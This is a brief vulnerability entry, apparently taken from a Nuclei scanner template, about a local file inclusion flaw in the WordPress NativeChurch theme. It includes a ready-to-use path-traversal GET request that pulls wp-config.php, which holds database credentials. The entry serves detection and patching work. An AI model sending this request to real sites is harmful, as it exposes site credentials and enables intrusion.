# Vulnerability: WordPress NativeChurch Theme - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`nativechurch-wp-theme-lfd.yaml`)

## Description
WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
```

